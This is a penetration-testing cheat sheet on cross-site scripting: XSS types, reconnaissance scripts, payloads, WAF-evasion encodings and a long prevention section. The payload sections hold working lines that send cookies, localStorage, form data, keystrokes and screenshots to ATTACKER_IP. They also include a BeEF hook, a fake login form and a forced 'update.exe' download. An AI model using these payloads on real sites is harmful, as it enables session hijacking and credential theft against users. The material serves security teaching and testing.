# XSS (Cross-Site Scripting)

## **Author:** Julien Bongars\*_Date:_* 2025-10-13 00:03:48**Path:** infiltration/web/xss-cross-site-scripting/main.md

## Overview

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. XSS occurs when user input is rendered in the browser without proper sanitization or encoding.

### Types of XSS

- **Reflected XSS**: Payload is part of the request (URL, form) and immediately reflected back
- **Stored XSS**: Payload is saved on the server (database, comments) and executed when page loads
- **DOM-based XSS**: Payload manipulates the DOM directly in client-side JavaScript

---

## Reconnaissance & Testing

### Security Headers Reference

| Header                      | Description                                                      | Secure Value                                                              | Insecure/Missing                                               |
| --------------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------------------- | -------------------------------------------------------------- |
| `Content-Security-Policy`   | Controls which resources can be loaded (scripts, styles, images) | `default-src 'self'; script-src 'self' 'nonce-RANDOM'; object-src 'none'` | Missing or contains `'unsafe-inline'`, `'unsafe-eval'`, or `*` |
| `X-Content-Type-Options`    | Prevents MIME type sniffing                                      | `nosniff`                                                                 | Missing                                                        |
| `X-Frame-Options`           | Prevents clickjacking attacks                                    | `DENY` or `SAMEORIGIN`                                                    | Missing or `ALLOW-FROM`                                        |
| `X-XSS-Protection`          | Legacy browser XSS filter (deprecated but defense-in-depth)      | `1; mode=block`                                                           | `0` or missing                                                 |
| `Strict-Transport-Security` | Forces HTTPS connections                                         | `max-age=31536000; includeSubDomains; preload`                            | Missing or low `max-age`                                       |
| `Referrer-Policy`           | Controls referrer information leakage                            | `no-referrer` or `strict-origin-when-cross-origin`                        | Missing or `unsafe-url`                                        |
| `Permissions-Policy`        | Controls browser features (camera, microphone, geolocation)      | `camera=(), microphone=(), geolocation=()`                                | Missing                                                        |

**Check headers:**

```bash
curl -I https://target.com
```

**Online tools:**

- https://securityheaders.com
- https://observatory.mozilla.org

---

### Static Code Analysis Tools

**JavaScript/Node.js:**

```bash
# ESLint with security plugin
npm install -g eslint eslint-plugin-security eslint-plugin-no-unsanitized
echo '{"extends": ["plugin:security/recommended", "plugin:no-unsanitized/DOM"]}' > .eslintrc
eslint src/

# Semgrep (pattern matching)
semgrep --config=p/xss .
semgrep --config=p/javascript .

# RetireJS (vulnerable dependencies)
retire --js --path ./

# NodeJsScan
nodejsscan --directory ./

# Snyk (dependencies + code)
snyk test
snyk code test
```

**Python:**

```bash
# Bandit
bandit -r . -f json -o report.json

# Semgrep
semgrep --config=p/xss .
semgrep --config=p/flask .
semgrep --config=p/django .
```

**PHP:**

```bash
# RIPS (commercial but has free tier)
rips-scanner scan:start --path=/var/www/html

# Progpilot
progpilot --file=index.php

# Semgrep
semgrep --config=p/xss .
semgrep --config=p/php .
```

**Java:**

```bash
# SpotBugs with Find Security Bugs plugin
spotbugs -textui -effort:max -low -html:fancy.xsl -output report.html target/

# Semgrep
semgrep --config=p/xss .
semgrep --config=p/java .
```

**Multi-Language:**

```bash
# SonarQube (self-hosted)
sonar-scanner -Dsonar.projectKey=myproject

# CodeQL (GitHub)
codeql database create mydb --language=javascript
codeql database analyze mydb --format=sarif-latest --output=results.sarif

# Semgrep (recommended - fast and accurate)
semgrep --config=auto .
```

---

### Browser Console Testing (DOM XSS)

**Find dangerous sinks in loaded scripts:**

```javascript
// Scan all scripts for dangerous patterns
(function() {
  const scripts = Array.from(document.scripts).map(s => s.src || "inline");
  const dangerous = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "eval",
    "setTimeout",
    "setInterval",
    "Function",
    "location.href",
    "location.replace",
    "location.assign",
  ];

  // Check global scope
  dangerous.forEach(func => {
    if (window[func]) {
      console.log(`[!] Found: ${func}`);
    }
  });

  // Search in loaded scripts (limited by CORS)
  console.log("Loaded scripts:", scripts);
})();
```

**Test for DOM XSS sources:**

```javascript
// Check if page uses dangerous sources
const sources = {
  "location.hash": location.hash,
  "location.search": location.search,
  "document.URL": document.URL,
  "document.referrer": document.referrer,
  "window.name": window.name,
};

Object.entries(sources).forEach(([name, value]) => {
  if (value) console.log(`[*] ${name}: ${value}`);
});

// Test if any are reflected in page
Object.entries(sources).forEach(([name, value]) => {
  if (value && document.body.innerHTML.includes(value)) {
    console.log(`[!] REFLECTED: ${name} appears in page HTML`);
  }
});
```

**Find all event handlers:**

```javascript
// List all elements with event handlers
const allElements = document.querySelectorAll("*");
const eventHandlers = [];

allElements.forEach(el => {
  const attrs = el.attributes;
  for (let i = 0; i < attrs.length; i++) {
    if (attrs[i].name.startsWith("on")) {
      eventHandlers.push({
        element: el.tagName,
        event: attrs[i].name,
        handler: attrs[i].value,
      });
    }
  }
});

console.table(eventHandlers);
```

**Monitor DOM mutations:**

```javascript
// Watch for innerHTML/outerHTML usage
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    if (mutation.type === "childList") {
      console.log("[*] DOM modified:", mutation.target);
    }
  });
});

observer.observe(document.body, {
  childList: true,
  subtree: true,
  attributes: true,
});

console.log("[*] Monitoring DOM mutations...");
```

**Find postMessage listeners:**

```javascript
// Check for postMessage event listeners
let hasPostMessage = false;

const originalAddEventListener = window.addEventListener;
window.addEventListener = function(type, listener, options) {
  if (type === "message") {
    console.log("[!] postMessage listener detected:", listener.toString());
    hasPostMessage = true;
  }
  return originalAddEventListener.call(this, type, listener, options);
};

// Test postMessage
if (hasPostMessage) {
  window.postMessage("<img src=x onerror=alert(1)>", "*");
}
```

**Analyze minified code patterns:**

```javascript
// Search for XSS sinks in minified code
(function() {
  const scripts = Array.from(document.scripts);
  const sinks = ["innerHTML", "outerHTML", "document.write", "eval"];

  scripts.forEach((script, idx) => {
    if (script.textContent) {
      const code = script.textContent;
      sinks.forEach(sink => {
        // Match common minified patterns: e.innerHTML, t.innerHTML, a[b]="innerHTML"
        const patterns = [
          new RegExp(`\\w+\\.${sink}`, "g"),
          new RegExp(`\\["${sink}"\\]`, "g"),
          new RegExp(`\\['${sink}'\\]`, "g"),
        ];

        patterns.forEach(pattern => {
          const matches = code.match(pattern);
          if (matches) {
            console.log(
              `[!] Script ${idx}: Found ${sink} (${matches.length} times)`,
            );
          }
        });
      });
    }
  });
})();
```

**Check for unsafe jQuery usage:**

```javascript
// jQuery XSS sinks
if (typeof jQuery !== "undefined") {
  console.log("[*] jQuery detected, checking for unsafe usage...");

  // Override .html() to detect usage
  const originalHtml = jQuery.fn.html;
  jQuery.fn.html = function(value) {
    if (value !== undefined) {
      console.log("[!] jQuery.html() called with:", value);
    }
    return originalHtml.apply(this, arguments);
  };

  // Check for .append(), .after(), .before(), etc.
  const dangerous = ["append", "after", "before", "prepend"];
  dangerous.forEach(method => {
    const original = jQuery.fn[method];
    jQuery.fn[method] = function(content) {
      console.log(`[!] jQuery.${method}() called with:`, content);
      return original.apply(this, arguments);
    };
  });
}
```

**Extract all URLs from page:**

```javascript
// Find all URLs that might be injection points
const urls = new Set();

// From links
document.querySelectorAll("a[href]").forEach(a => urls.add(a.href));

// From forms
document.querySelectorAll("form[action]").forEach(f => urls.add(f.action));

// From scripts
document.querySelectorAll("script[src]").forEach(s => urls.add(s.src));

// From AJAX calls (intercept fetch)
const originalFetch = window.fetch;
window.fetch = function(...args) {
  console.log("[*] Fetch to:", args[0]);
  urls.add(args[0]);
  return originalFetch.apply(this, args);
};

console.log("URLs found:", Array.from(urls));
```

---

## Basic Payloads

### Simple Alert Test

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Ping Attacker Server

```html
<img src="http://ATTACKER_IP/ping.png" />
<script src="http://ATTACKER_IP/script.js"></script>
```

### Execute Arbitrary JavaScript

```html
<img src=x onerror="PAYLOAD_HERE" />
<svg onload="PAYLOAD_HERE">
<iframe srcdoc="<script>PAYLOAD_HERE</script>">
```

---

## Data Exfiltration Payloads

### Steal Session Cookie

```html
<img src=x onerror="new Image().src='http://ATTACKER_IP:8080/?c='+document.cookie" />

<script>
fetch('http://ATTACKER_IP:8080/?c='+document.cookie);
</script>

<script>
document.location='http://ATTACKER_IP:8080/?c='+document.cookie;
</script>
```

### Steal Local Storage

```html
<script>
new Image().src='http://ATTACKER_IP:8080/?data='+btoa(JSON.stringify(localStorage));
</script>
```

### Steal Form Data

```html
<script>
document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(e.target);
    const data = Object.fromEntries(formData.entries());
    new Image().src = 'http://ATTACKER_IP:8080/?data='+btoa(JSON.stringify(data));
    e.target.submit();
});
</script>
```

### Keylogger

```html
<script>
document.addEventListener('keypress', function(e) {
    new Image().src='http://ATTACKER_IP:8080/?key='+e.key;
});
</script>
```

### Capture Screenshots (HTML2Canvas)

```html
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
<script>
html2canvas(document.body).then(canvas => {
    fetch('http://ATTACKER_IP:8080/', {
        method: 'POST',
        body: canvas.toDataURL()
    });
});
</script>
```

---

## Advanced Techniques

### Execute on User Action

```html
<script>
document.addEventListener('click', function() {
    fetch('http://ATTACKER_IP/payload.exe').then(r => r.blob()).then(b => {
        const url = URL.createObjectURL(b);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'update.exe';
        a.click();
    });
});
</script>
```

### BeEF Hook (Browser Exploitation Framework)

```html
<script src="http://ATTACKER_IP:3000/hook.js"></script>
```

### Create Fake Login Form

```html
<script>
document.body.innerHTML = `
    <form action="http://ATTACKER_IP:8080/steal" method="POST">
        <h2>Session Expired - Please Login Again</h2>
        <input name="username" placeholder="Username" required>
        <input name="password" type="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
`;
</script>
```

---

## WAF Evasion Techniques

### 1. Obscure HTML Tags

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### 2. Mixed Case

```html
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=x OnErRoR=alert(1)>
```

### 3. HTML Encoding

```html
&#60;script&#62;alert(1)&#60;/script&#62;
&lt;img src=x onerror=alert(1)&gt;
```

### 4. Hex Encoding

```html
<img src=x onerror="\x61\x6c\x65\x72\x74(1)">
```

### 5. Unicode Encoding

```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### 6. Base64 Encoding

```html
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 7. JavaScript Comments to Break Detection

```html
<script>alert(1)//</script>
<script>alert(1)/**/</script>
<img src=x onerror="ale/**/rt(1)">
```

### 8. String Concatenation

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert('X'+'S'+'S')</script>
<script>eval('al'+'ert(1)')</script>
```

### 9. Template Literals

```html
<script>alert`1`</script>
<script>eval`alert\x281\x29`</script>
```

### 10. JSFuck / Character Obfuscation

```html
<script>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]</script>
```

### 11. Null Bytes

```html
<script>alert(1)%00</script>
<img src=x%00 onerror=alert(1)>
```

### 12. Double Encoding

```html
%253Cscript%253Ealert(1)%253C/script%253E
```

### 13. Polyglot Payloads

```html
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

### 14. Filter Bypass with Newlines

```html
<img src=x onerror="
alert
(1)">
```

### 15. Using Different Events

```html
<body onload=alert(1)>
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

---

## Context-Specific Payloads

### Inside HTML Tag Attribute

```html
" onclick="alert(1)
" autofocus onfocus="alert(1)
" onmouseover="alert(1)
```

### Inside JavaScript String

```javascript
'; alert(1); //
</script><script>alert(1)</script>
```

### Inside JavaScript Template Literal

```javascript
${alert(1)}
```

### Inside Event Handler

```html
onerror=alert(1)//
onerror='alert(1)'
```

### Breaking Out of HTML Comments

```html
--><script>alert(1)</script><!--
```

---

## DOM-Based XSS

### location.hash

```javascript
<script>eval(location.hash.slice(1))</script>;
// URL: http://target.com/page#alert(1)
```

### document.write() Sink

```javascript
<script>document.write(location.hash.slice(1));</script>;
// URL: http://target.com/page#<img src=x onerror=alert(1)>
```

### innerHTML Sink

```javascript
<script>element.innerHTML = location.hash.slice(1);</script>;
```

---

## Testing & Detection

### Manual Testing

```bash
# Basic test
<script>alert('XSS')</script>

# Image tag test
<img src=x onerror=alert('XSS')>

# SVG test
<svg onload=alert('XSS')>

# Check if script executes
<script>console.log('XSS executed')</script>
```

### Automated Scanning

```bash
# XSStrike
python xsstrike.py -u "http://target.com/search?q=FUZZ"

# Dalfox
dalfox url http://target.com/search?q=FUZZ

# XSS Hunter
# Use XSS Hunter payload to test blind XSS
<script src=https://yoursubdomain.xss.ht></script>
```

---

## Prevention & Mitigation

### 1. Input Validation

```javascript
// Whitelist approach - only allow specific characters
function validateInput(input) {
  const allowedPattern = /^[a-zA-Z0-9\s]+$/;
  return allowedPattern.test(input);
}

// Reject dangerous patterns
const dangerousPatterns = /<script|javascript:|onerror=|onload=/i;
if (dangerousPatterns.test(userInput)) {
  // Reject input
}
```

### 2. Output Encoding (Context-Aware)

**HTML Context:**

```javascript
// Encode HTML special characters
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

**JavaScript Context:**

```javascript
// Use JSON.stringify for JS contexts
const safeData = JSON.stringify(userData);
```

**URL Context:**

```javascript
// Use encodeURIComponent
const safeUrl = encodeURIComponent(userInput);
```

**CSS Context:**

```javascript
// Escape CSS special characters
function escapeCSS(unsafe) {
  return unsafe.replace(/[^a-zA-Z0-9]/g, "\\$&");
}
```

### 3. Content Security Policy (CSP)

**Strict CSP Header:**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'; style-src 'self' 'nonce-RANDOM'; object-src 'none'; base-uri 'self';
```

**Nonce-based CSP:**

```html
<!-- In HTTP header -->
Content-Security-Policy: script-src 'nonce-r4nd0m'

<!-- In HTML -->
<script nonce="r4nd0m">
    // Only scripts with matching nonce execute
</script>
```

**Report-Only Mode (Testing):**

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

### 4. HTTP Headers

```http
# Prevent MIME type sniffing
X-Content-Type-Options: nosniff

# Enable XSS filter (legacy browsers)
X-XSS-Protection: 1; mode=block

# Prevent clickjacking (defense in depth)
X-Frame-Options: DENY

# Referrer policy
Referrer-Policy: no-referrer
```

### 5. Framework-Specific Protections

**React:**

```javascript
// React escapes by default
<div>{userInput}</div>  // Safe

// Dangerous - avoid dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />  // Unsafe
```

**Vue.js:**

```javascript
// Vue escapes by default
<div>{{ userInput }}</div>  // Safe

// Dangerous - v-html directive
<div v-html="userInput"></div>  // Unsafe
```

**Angular:**

```typescript
// Angular sanitizes by default
<div>{{ userInput }}</div>  // Safe

// Use DomSanitizer for trusted HTML
import { DomSanitizer } from '@angular/platform-browser';
constructor(private sanitizer: DomSanitizer) {}
trustedHtml = this.sanitizer.sanitize(SecurityContext.HTML, userInput);
```

### 6. Cookie Security

```http
# HttpOnly prevents JavaScript access
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict

# Secure flag for HTTPS only
Set-Cookie: sessionid=abc123; Secure

# SameSite prevents CSRF
Set-Cookie: sessionid=abc123; SameSite=Strict
```

### 7. Server-Side Sanitization Libraries

**Node.js (DOMPurify):**

```javascript
const DOMPurify = require("isomorphic-dompurify");
const clean = DOMPurify.sanitize(dirtyInput);
```

**Python (Bleach):**

```python
import bleach
clean = bleach.clean(user_input)
```

**PHP:**

```php
$clean = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

**Java (OWASP Java Encoder):**

```java
String safe = Encode.forHtml(userInput);
```

### 8. Defense in Depth Strategy

1. **Input Validation**: Reject invalid input at entry point
2. **Output Encoding**: Encode data based on context
3. **CSP**: Restrict what scripts can execute
4. **HttpOnly Cookies**: Prevent cookie theft
5. **Security Headers**: Enable browser protections
6. **WAF**: Web Application Firewall for additional filtering
7. **Regular Security Audits**: Automated and manual testing
8. **Security Training**: Educate developers on XSS risks

### 9. Common Mistakes to Avoid

- ❌ Blacklist filtering (easily bypassed)
- ❌ Client-side validation only
- ❌ Using innerHTML with user input
- ❌ Trusting data from URLs/cookies
- ❌ Insufficient context-aware encoding
- ❌ Allowing inline scripts without CSP nonces
- ❌ Not setting HttpOnly on sensitive cookies

### 10. Secure Coding Practices

```javascript
// ✅ Good: Use textContent instead of innerHTML
element.textContent = userInput;

// ❌ Bad: Using innerHTML with user input
element.innerHTML = userInput;

// ✅ Good: Create elements programmatically
const img = document.createElement("img");
img.src = userInput;
img.alt = "User image";

// ❌ Bad: String concatenation with user input
html = "<img src=\"" + userInput + "\">";

// ✅ Good: Use parameterized queries/prepared statements
// ❌ Bad: String concatenation in SQL/HTML/JS
```

---

## Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [HackTricks - XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [Content Security Policy Reference](https://content-security-policy.com/)

---

**Remember**: Always test for XSS on authorized systems only. Unauthorized testing is illegal.
